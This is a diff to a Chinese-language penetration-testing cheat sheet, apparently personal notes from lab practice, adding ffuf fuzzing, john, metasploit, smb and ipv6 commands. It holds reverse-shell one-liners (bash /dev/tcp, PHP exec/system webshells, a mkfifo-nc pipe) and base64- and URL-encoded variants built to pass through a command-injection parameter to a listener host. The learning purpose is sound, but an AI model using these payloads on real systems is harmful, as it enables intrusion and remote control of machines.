@@ -61,6 +61,8 @@ zip2john 目标文件 > 输出文件
 ```bash
 #f代表format可以省略，w代表wordlist
 john -f=加密类型 -w=字典 目标文件
+#用--show查看结果
+john --show 目标文件
 ```
 
 ## hashid
@@ -119,6 +121,9 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://
 -H "User-Agent:User-Agent_value"
 #例如
 ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://192.168.6.158/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers/FUZZ" -fc 400 -fs 1128 -H "Cookie:PHPSESSID=1v29r1ecanau39c969mcbfktqq" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+
+#用post测试
+ffuf -u 'http://192.168.6.232/auth.php' -X POST -d 'FUZZ=1' -w '/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt' -H 'Cookie:PHPSESSID=420r2se44hsbes95uufs76f1k4' -H 'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' -fs 0
 ```
 
 ## Netcat
@@ -145,6 +150,10 @@ select * from users where id=1 union select 1,'<?php exec("/bin/bash -c \'bash -
 
 
 ```bash
+###PS：eval执行的是一段PHP代码，system和exec执行的是一段系统命令
+###因此eval和webshell搭配（无法执行bash -i等反弹shell的命令，且蚁剑等需用POST），system、exec和bash、mkfifo搭配（反弹shell，一般bash要进行编码）
+
+
 #探测某ip端口是否开放和是否运行服务
 ┌──(dxt㉿kali)-[~]
 └─$ nc 192.168.6.178 22
@@ -154,11 +163,21 @@ nc -lvp (127.0.0.1) 5555
 
 #建立反向连接
 bash -i >& /dev/tcp/192.168.6.149/5555 0>&1
-#PHP的（eval不能用）
+
+###PS：这个是用于上传一个反弹shell使得每次访问就可以执行这个反弹shell的
+#PHP的（eval不能用，因为eval执行的是php代码不是系统命令）
 <?php exec('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
 <?php system('/bin/bash -c "bash -i >& /dev/tcp/192.168.6.149/6666 0>&1"') ?>
 #之所有不能直接使用bash -i，而还要使用/bin/bash -c声明解释器是因为php的system默认使用的/bin/sh是dash而不是bash，就算后边有bash -i，也是将整个命令先传递给默认shell(dash)解析后显示调用bash，但是dash是解析不了>&这些符号的，所以调用了bash也没用，无法建立反弹shell。
 #而直接在命令行输入可以建立是因为对命令行来说这是一个显示的调用bash处理的命令，而并不会先由默认的shell(dash)解析，所以可以建立反弹shell。
+
+
+###PS：这个是用于访问$_GET['cmd']的时候传入的命令，URL会错误解析>&，所以需要用base64
+#反向连接base64编码其中特别注意-i和7777后都有两个空格（即>或者&前应该多一个空格），用base64编码，后边用url编码
+echo "bash -i  >& /dev/tcp/192.168.6.149/7777  0>&1" |base64 -d |bash
+echo "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC42LjE0OS83Nzc3ICAwPiYx"%20%7cbase64%20-d%20%7cbash
+
+
 
 #或者使用nc
 nc -c /bin/bash 192.168.6.149
@@ -167,6 +186,16 @@ nc 192.168.6.149 5555
 #有的时候版本不同，不支持-e选项，可以尝试去掉-e，用-c或者直接不用
 #然后用srcipt启动一个新的bash shell
 script /dev/null -c bash
+script -qc "/bin/bash -i" /dev/null
+
+
+#或者使用mkfifo命名管道
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.6.149 7777 > /tmp/f
+#编码方式
+echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i  2>&1 | nc 192.168.6.149 7777 >  /tmp/f" | base64 -d |bash
+echo%20"cm0gLWYgL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9iYXNoIC1pICAyPiYxIHwgbmMgMTkyLjE2OC42LjE0OSA3Nzc3ICA+IC90bXAvZg=="%20%7c%20base64%20-d%20%7cbash
+
+
 
 
 
@@ -264,6 +293,25 @@ run
 sessions -i
 ```
 
+2、search
+
+根据名字搜索利用脚本
+
+```bash
+search vul_name
+```
+
+3、sessions
+
+```bash
+#查看所有会话
+sessions -l
+#进入某个会话
+sessions -i session_id
+```
+
+
+
 ## sqlmap
 
 ```bash
@@ -340,5 +388,54 @@ sessions -i
 ```bash
 #在本地port开启一个http服务器,默认网页文件位置是当前执行命令路径
 python -m http.server port
+```
+
+## AntSword
+
+```bash
+#蚁剑创建的webshell是无法进行sudo su的，好像是因为因为是虚拟终端，无法实现这种交互式的行为
+```
+
+## ping6
+
+```bash
+#nmap扫描ipv6,要用%在ipv6地址中指定目标网卡
+sudo nmap -6 -p- ipv6_value%Ethernet_id
+#ping找到网络内所有ipv6，-I指定扫描的网卡
+ping 6 -I eth0 ipv6_value
+#查看ipv6的MAC
+ip -6 neigh show
+```
+
+## searchsploit
+
+用于搜索可利用的脚本和方法
+
+```bash
+searchsploit vul_name
+#得到的脚本和方法的默认路径
+/usr/share/exploitdb/exploits/
+```
+
+## smbmap
+
+查看smb中的共享文件的访问权限
+
+```bash
+#-H指定目标主机，-u指定以何身份访问
+smbmap -H 192.168.6.174 -u guest
+```
+
+## smbclient
+
+获取smb中的共享文件，进入smb后会出现一个交互式smb的命令行
+
+```bash
+#连续\\是因为避免\被转义,注意-U是大写，指定访问用户
+smbclient \\\\192.168.6.173\\DebianShare -U guest
+#查看有哪些文件
+dir
+#获取文件（会自动下载到运行smbclient时的目录）
+get file_name
 ```
 
